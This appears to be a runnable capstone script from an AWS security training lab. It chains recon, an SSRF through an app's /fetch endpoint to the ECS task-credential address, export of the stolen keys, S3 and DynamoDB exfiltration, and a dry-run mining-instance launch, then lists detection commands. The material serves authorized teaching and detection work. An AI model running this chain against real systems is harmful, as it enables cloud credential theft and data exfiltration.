#!/usr/bin/env bash
#
# Day 11 capstone — SCRIPTED ATTACK against your OWN labs/base workload.
#
# ============================================================================
# AUTHORIZED TESTING ONLY. This script must be run only against an AWS
# account and workload you own and are explicitly authorized to test —
# your own `labs/base` deployment, and nothing else. See
# content/ANTIPATTERNS.md's authorized-testing statement. Every value below
# is a PLACEHOLDER: no real account ID, ARN, key, or hostname ships in this
# file. Fill them in from your own `terraform output` before running.
# ============================================================================
#
# Read labs/capstone/attack-runbook.md FIRST — this script is the runnable
# companion to that document, not a replacement for reading it. Run it
# section by section (or with the pauses left in) so you actually capture
# each artifact instead of blowing through the whole chain at once.
#
# Requires: AWS CLI v2, curl, jq. No terraform apply/destroy happens here.

set -euo pipefail

# ---------------------------------------------------------------------------
# 0. FILL THESE IN from `terraform output` in labs/base (and labs/day08 for
#    detection). Every value here is a placeholder — replace before running.
# ---------------------------------------------------------------------------
AWS_REGION="${AWS_REGION:-<your-region>}"                     # e.g. us-east-1
APP_URL="${APP_URL:-http://<your-alb-dns-name>}"               # terraform output alb_dns_name (or the CloudFront domain, https)
APP_BUCKET="${APP_BUCKET:-<your-app-bucket-name>}"              # terraform output app_bucket_name
DDB_TABLE_NAME="${DDB_TABLE_NAME:-<your-dynamodb-table-name>}"  # table name portion of terraform output db_endpoint
TASK_ROLE_ARN="${TASK_ROLE_ARN:-<your-task-role-arn>}"          # terraform output task_role_arn (for your own reference/log only)

# The ECS task credentials relative-URI path segment (e.g. /v2/credentials/<GUID>).
# See attack-runbook.md's note on why this is a required input, not something
# this script derives via SSRF alone — it is a deliberate AWS mitigation.
CREDS_RELATIVE_URI="${CREDS_RELATIVE_URI:-/v2/credentials/<placeholder-guid>}"

EVIDENCE_DIR="${EVIDENCE_DIR:-./capstone-evidence}"
mkdir -p "$EVIDENCE_DIR"

pause() {
  echo
  echo ">>> $1"
  echo ">>> Capture the output above into $EVIDENCE_DIR before continuing."
  read -r -p ">>> Press Enter to continue, Ctrl-C to stop here... " _
}

echo "=== Day 11 capstone attack — authorized self-test against your own workload ==="
echo "Region:        $AWS_REGION"
echo "App URL:       $APP_URL"
echo "Bucket:        $APP_BUCKET"
echo "Table:         $DDB_TABLE_NAME"
echo "Task role ARN: $TASK_ROLE_ARN"
echo

# ---------------------------------------------------------------------------
# Stage 1 — Leaked access key (narrated only; see attack-runbook.md).
# We run every step below with your existing deployer credentials, treated
# in-story as if they had leaked. No second IAM identity is created.
# ---------------------------------------------------------------------------
echo "--- Stage 1: leaked access key (narrated — using your existing credentials) ---"
aws sts get-caller-identity --region "$AWS_REGION" | tee "$EVIDENCE_DIR/01-caller-identity.json"
pause "Stage 1 artifact: 01-caller-identity.json (this identity plays 'the leaked key')"

# ---------------------------------------------------------------------------
# Stage 2 — Recon: map the workload with that key's read access.
# ---------------------------------------------------------------------------
echo "--- Stage 2: recon ---"
aws elbv2 describe-load-balancers --region "$AWS_REGION" \
  | tee "$EVIDENCE_DIR/02-describe-load-balancers.json" >/dev/null
aws ecs list-services --region "$AWS_REGION" --cluster "${ECS_CLUSTER_ARN:-<your-ecs-cluster-arn>}" \
  | tee "$EVIDENCE_DIR/02-ecs-list-services.json" >/dev/null
echo "Recon output saved to $EVIDENCE_DIR/02-*.json"
pause "Stage 2 artifact: CloudTrail should show these as read-only management events under your caller identity."

# ---------------------------------------------------------------------------
# Stage 3 — SSRF exploit: hit the app's /fetch endpoint, pointed at the ECS
# task credentials endpoint (169.254.170.2 is the fixed ECS credential
# provider address; CREDS_RELATIVE_URI is the per-task path segment).
# ---------------------------------------------------------------------------
echo "--- Stage 3: SSRF exploit ---"
TARGET="http://169.254.170.2${CREDS_RELATIVE_URI}"
ENCODED_TARGET=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$TARGET")
curl -s "${APP_URL}/fetch?url=${ENCODED_TARGET}" | tee "$EVIDENCE_DIR/03-ssrf-response.json"
pause "Stage 3/4 artifact: 03-ssrf-response.json should contain AccessKeyId/SecretAccessKey/Token/Expiration."

# ---------------------------------------------------------------------------
# Stage 4 — Parse and export the stolen credentials.
# ---------------------------------------------------------------------------
echo "--- Stage 4: exporting stolen task-role credentials ---"
STOLEN_AKID=$(jq -r '.AccessKeyId' "$EVIDENCE_DIR/03-ssrf-response.json")
STOLEN_SECRET=$(jq -r '.SecretAccessKey' "$EVIDENCE_DIR/03-ssrf-response.json")
STOLEN_TOKEN=$(jq -r '.Token' "$EVIDENCE_DIR/03-ssrf-response.json")

if [[ -z "$STOLEN_AKID" || "$STOLEN_AKID" == "null" ]]; then
  echo "!!! No credentials parsed. Check CREDS_RELATIVE_URI and that the app's /fetch endpoint is reachable." >&2
  exit 1
fi

export AWS_ACCESS_KEY_ID="$STOLEN_AKID"
export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET"
export AWS_SESSION_TOKEN="$STOLEN_TOKEN"
aws sts get-caller-identity --region "$AWS_REGION" | tee "$EVIDENCE_DIR/04-stolen-identity.json"
pause "Stage 4 artifact: 04-stolen-identity.json — confirm the Arn now shows the task role's assumed-role session."

# ---------------------------------------------------------------------------
# Stage 5 — Data exfil using the STOLEN credentials, run from outside AWS
# (your workstation, not from inside the VPC) — this is the tell GuardDuty's
# InstanceCredentialExfiltration-family finding looks for.
# ---------------------------------------------------------------------------
echo "--- Stage 5: data exfil with stolen credentials ---"
aws s3 ls "s3://${APP_BUCKET}" --region "$AWS_REGION" | tee "$EVIDENCE_DIR/05-s3-listing.txt"
aws s3 sync "s3://${APP_BUCKET}" "$EVIDENCE_DIR/exfil-loot/" --region "$AWS_REGION"
aws dynamodb scan --table-name "$DDB_TABLE_NAME" --region "$AWS_REGION" \
  | tee "$EVIDENCE_DIR/05-dynamodb-scan.json" >/dev/null
pause "Stage 5 artifact: 05-s3-listing.txt, exfil-loot/, 05-dynamodb-scan.json — plus whatever GuardDuty/Security Hub emit."

# ---------------------------------------------------------------------------
# Stage 6 — Crypto-mining-flavored API call, SAFE stand-in via --dry-run.
# This never actually launches an instance — it only proves the stolen
# credentials could attempt to, and leaves the same CloudTrail trail a real
# attempt would (errorCode: DryRunOperation), at zero cost and zero risk.
# ---------------------------------------------------------------------------
echo "--- Stage 6: crypto-mining-flavored call (safe --dry-run stand-in) ---"
set +e
aws ec2 run-instances \
  --region "$AWS_REGION" \
  --image-id "${DUMMY_AMI_ID:-<placeholder-ami-id>}" \
  --instance-type "p3.16xlarge" \
  --dry-run 2>&1 | tee "$EVIDENCE_DIR/06-dryrun-runinstances.txt"
set -e
pause "Stage 6 artifact: 06-dryrun-runinstances.txt should show 'DryRunOperation' — that's success, not a failure to fix."

# ---------------------------------------------------------------------------
# Clear the stolen credentials from this shell before moving on.
# ---------------------------------------------------------------------------
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
echo "--- Stolen credentials unset from this shell. They also expire on their own (short-lived by design). ---"

echo
echo "=== Attack chain complete. Now capture the detection-side artifacts: ==="
echo "aws cloudtrail lookup-events --region $AWS_REGION --start-time <window-start> --end-time <window-end>"
echo "aws guardduty list-detectors --region $AWS_REGION"
echo "aws guardduty list-findings --region $AWS_REGION --detector-id <detector-id>"
echo "aws guardduty get-findings --region $AWS_REGION --detector-id <detector-id> --finding-ids <finding-id>"
echo "aws securityhub get-findings --region $AWS_REGION"
echo "aws configservice get-resource-config-history --region $AWS_REGION --resource-type AWS::S3::Bucket --resource-id $APP_BUCKET"
echo
echo "See attack-runbook.md's capture checklist and attack-SOLUTION.md for what each should show."
